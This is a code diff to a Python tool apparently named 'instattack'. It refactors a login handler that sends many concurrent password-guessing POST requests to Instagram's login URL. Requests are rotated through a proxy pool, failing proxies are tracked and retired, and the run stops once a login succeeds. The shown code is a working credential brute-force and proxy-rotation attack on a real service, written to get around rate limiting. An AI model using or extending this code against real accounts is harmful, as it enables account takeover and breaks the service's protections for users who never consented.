@@ -6,24 +6,24 @@ import collections
 
 from instattack import settings
 from instattack.lib import starting, starting_context
-from instattack.exceptions import (
-    ResultNotInResponse, InstagramResultError, NoPasswordsError)
 
-from instattack.core.models import LoginAttemptContext, LoginContext
 from instattack.core.utils import limit_on_success, limit_as_completed
 
+from .models import LoginAttemptContext, LoginContext
+from .exceptions import ResultNotInResponse, InstagramResultError, NoPasswordsError
 from .base import PostRequestHandler
 
 
-class PasswordHandler(PostRequestHandler):
+class LoginHandler(PostRequestHandler):
 
-    __name__ = 'Password Handler'
+    __name__ = 'Login Handler'
 
-    def __init__(self, proxy_handler, limit=None, **kwargs):
-        kwargs.setdefault('method', 'POST')
-        super(PasswordHandler, self).__init__(proxy_handler, **kwargs)
+    def __init__(self, config, proxy_handler, **kwargs):
+        super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)
 
-        self.limit = limit
+        self.limit = config['login']['pwlimit']
+        self.batch_size = config['login']['batch_size']
+        self.attempt_batch_size = config['login']['attempt_batch_size']
 
         self.results = asyncio.Queue()
         self.attempts = asyncio.Queue()
@@ -31,17 +31,14 @@ class PasswordHandler(PostRequestHandler):
 
         # Index for the current password and attempts per password.
         self.login_index = 0
-        self.generated_index = 0
-        self.attempts_index = collections.Counter()
-        self.completed_index = 0
+        self.num_completed = 0
+
+        self.attempts_count = collections.Counter()  # Indexed by Password
+        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID
 
     async def run(self, loop, token):
 
         await self.prepopulate(loop)
-
-        # Wait for start event to signal that we are ready to start making
-        # requests with the proxies.
-        await self.start_event.wait()
 
         with starting_context(self):
             # Make sure we are just returning the results from the login attempts
@@ -72,16 +69,11 @@ class PasswordHandler(PostRequestHandler):
         while True:
             password = await self.passwords.get()
             if password:
-                self.log.critical('Creating Task!')
-                context = LoginContext(
-                    index=self.login_index,
-                    token=token,
-                    password=password
-                )
-                yield self.login_with_password(loop, session, context)
+                self.log.info('Created Task for Password %s' % password)
+                yield self.login_with_password(loop, session, token, password)
                 self.login_index += 1
 
-    async def login_attempt_task_generator(self, loop, session, login_context):
+    async def login_attempt_task_generator(self, loop, session, context):
         """
         Generates coroutines for each password to be attempted and yields
         them in the generator.
@@ -91,28 +83,25 @@ class PasswordHandler(PostRequestHandler):
         have not been run yet.
         """
         while True:
-            # Temporary - Just until we can figure out what's going on.
-            await asyncio.sleep(4)
-
             proxy = await self.proxy_handler.pool.get()
-            # if proxy.unique_id in self.proxies_tried:
-            #     self.log.error('Proxy already tried.', extra={'proxy': proxy})
-            #     return
             if proxy:
-                context = LoginAttemptContext(
-                    index=self.attempts_index[login_context.password],
-                    parent_index=login_context.index,
-                    password=login_context.password,
-                    token=login_context.token,
-                    proxy=proxy,
-                )
-                yield self.login_request(loop, session, context, proxy)
+                if proxy.unique_id in self.proxies_count:
+                    self.log.warning(
+                        f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
+                        extra={'proxy': proxy}
+                    )
+
+                self.proxies_count[proxy.unique_id] += 1
+
+                yield self.login_request(
+                    loop, session, context.token, context.password, proxy,
+                    index=context.index)
 
                 # Might need a lock here.
-                self.attempts_index[login_context.password] += 1
+                self.attempts_count[context.password] += 1
 
     @starting('Login Requests')
-    async def attempt_login(self, loop, token, batch_size=10):
+    async def attempt_login(self, loop, token):
         """
         ClientSession
         -------------
@@ -133,31 +122,44 @@ class PasswordHandler(PostRequestHandler):
         so we don't wind up making the same request hundreds of times if we run
         into issues.
         """
+        await self.start_event.wait()
+
         async with aiohttp.ClientSession(
             connector=self._connector,
             timeout=self._timeout
         ) as session:
             async for result in limit_as_completed(self.login_task_generator(loop, session, token),
-                    batch_size, stop_event=self.stop_event):
+                    self.batch_size, stop_event=self.stop_event):
 
-                if not result or not result.conclusive:
-                    raise RuntimeError("Result should be valid and conslusive.")
+                res = await result
+                if not res or not res.conclusive:
+                    raise RuntimeError("Result should be valid and conclusive.")
 
-                self.completed_index += 1
+                self.num_completed += 1
                 self.log.info("{0:.2%}".format(
-                    float(self.completed_index) / self.passwords.qsize()))
-                await self.results.put(result)
+                    float(self.num_completed) / self.passwords.qsize()))
+                await self.results.put(res)
 
-                if result.authorized:
+                if res.authorized:
                     self.stop_event.set()
                     break
 
-                self.log.error("Not Authenticated", extra={'password': result.context.password})
-                await self.attempts.put(result.context.password)
+                self.log.error("Not Authenticated", extra={'password': res.context.password})
+                await self.attempts.put(res.context.password)
 
         # await asyncio.sleep(0)
 
-    async def login_with_password(self, loop, session, context, batch_size=5):
+    async def attempt_single_login(self, loop, token, password):
+        await self.start_event.wait()
+
+        with starting_context(self, 'Single Login Request'):
+            async with aiohttp.ClientSession(
+                connector=self._connector,
+                timeout=self._timeout
+            ) as session:
+                return await self.login_with_password(loop, session, token, password)
+
+    async def login_with_password(self, loop, session, token, password):
         """
         Makes concurrent fetches for a single password and limits the number of
         current fetches to the batch_size.  Will return when it finds the first
@@ -169,10 +171,22 @@ class PasswordHandler(PostRequestHandler):
         so we don't wind up making the same request hundreds of times if we run
         into issues.
         """
-        return await limit_on_success(
-            self.login_attempt_task_generator(loop, session, context), batch_size)
 
-    async def login_request(self, loop, session, context, proxy):
+        # Wait for start event to signal that we are ready to start making
+        # requests with the proxies.
+        await self.start_event.wait()
+
+        context = LoginContext(
+            index=self.login_index,
+            token=token,
+            password=password
+        )
+        return await limit_on_success(
+            self.login_attempt_task_generator(loop, session, context),
+            self.attempt_batch_size
+        )
+
+    async def login_request(self, loop, session, token, password, proxy, index=None):
         """
         TODO
         ----
@@ -180,37 +194,38 @@ class PasswordHandler(PostRequestHandler):
         that is smarter and will notify the handler to use a different proxy and
         note the time.
         """
+        context = LoginAttemptContext(
+            index=self.attempts_count[password],
+            parent_index=index,
+            password=password,
+            token=token,
+            proxy=proxy,
+        )
+
         self.log.debug('Login Request', extra={'context': context})
         try:
             async with session.post(
                 settings.INSTAGRAM_LOGIN_URL,
-                headers=self._headers(context.token),
-                # Only Http Proxies Are Supported by AioHTTP?  But maybe only for GET requests?
-                proxy=proxy.https_url
+                headers=self._headers(token),
+                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
             ) as response:
                 # Only reason to log these errors here is to provide the response
                 # object
                 try:
                     result = await self._handle_client_response(response, context)
-
                 except ResultNotInResponse as e:
-                    # loop.call_soon(self.add_proxy_error, proxy, e)
+                    loop.call_soon(self.add_proxy_error, proxy, e)
                     self.log.error(e, extra={'response': response, 'context': context})
-
                 else:
                     try:
                         result = await self._handle_parsed_result(result, context)
-
                     except InstagramResultError as e:
-                        # loop.call_soon(self.add_proxy_error, proxy, e)
+                        loop.call_soon(self.add_proxy_error, proxy, e)
                         self.log.error(e, extra={'response': response, 'context': context})
-
                     else:
                         if not result:
                             raise RuntimeError("Result should not be None here.")
-
-                        # TODO: Note success of proxy.
-                        # loop.call_soon(self.maintain_proxy, proxy)
+                        loop.call_soon(self.add_proxy_success, proxy)
                         return result
 
         # TODO: For certain situations, we might want to mark the proxy as invalid,
@@ -222,22 +237,22 @@ class PasswordHandler(PostRequestHandler):
             RuntimeError: File descriptor 87 is used by transport
             <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
             """
-            # loop.call_soon(self.add_proxy_error, proxy, e)
+            loop.call_soon(self.add_proxy_error, proxy, e)
             self.log.error(e, extra={'context': context})
 
         except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
             # Situation in which we would want to mark proxy as invalid.
-            # loop.call_soon(self.add_proxy_error, proxy, e)
+            loop.call_soon(self.add_proxy_error, proxy, e)
             self.log.error(e, extra={'context': context})
 
         except asyncio.TimeoutError as e:
             # Situation in which we would want to mark proxy as invalid.
-            # loop.call_soon(self.add_proxy_error, proxy, e)
+            loop.call_soon(self.add_proxy_error, proxy, e)
             self.log.error(e, extra={'context': context})
 
         except aiohttp.ClientConnectionError as e:
             # Situation in which we would want to mark proxy as invalid.
-            # loop.call_soon(self.add_proxy_error, proxy, e)
+            loop.call_soon(self.add_proxy_error, proxy, e)
             self.log.error(e, extra={'context': context})
 
         except OSError as e:
@@ -246,33 +261,31 @@ class PasswordHandler(PostRequestHandler):
             # >>> OSError: [Errno 54] Connection reset by peer
             if e.errno == 54:
                 # Not sure if we should maintain proxy or not?
-                # loop.call_soon(self.add_proxy_error, proxy, e)
+                loop.call_soon(self.add_proxy_error, proxy, e)
                 self.log.error(e, extra={'context': context})
 
             elif e.errno == 24:
-                asyncio.sleep(3)
+                await asyncio.sleep(3)
                 self.log.error(e, extra={
                     'context': context,
                     'other': f'Sleeping for {3} seconds...'
                 })
-                # loop.call_soon(self.maintain_proxy, proxy)
+                loop.call_soon(self.maintain_proxy, proxy)
             else:
                 raise e
 
         except asyncio.CancelledError as e:
-            # Do we want to do this?
-            # loop.call_soon(self.maintain_proxy, proxy)
-            pass
+            loop.call_soon(self.maintain_proxy, proxy)
 
         except aiohttp.ClientError as e:
             # For whatever reason these errors don't have any message...
             if e.status == 429:
                 e.message = 'Too many requests.'
-                # Probably want to handle this error more specifically.
-                # loop.call_soon(self.add_proxy_error, proxy, e)
+
+                loop.call_soon(self.add_proxy_error, proxy, e)
                 self.log.error(e, extra={'context': context})
             else:
-                # loop.call_soon(self.add_proxy_error, proxy, e)
+                loop.call_soon(self.add_proxy_error, proxy, e)
                 self.log.error(e, extra={'context': context})
 
     async def save(self, loop):
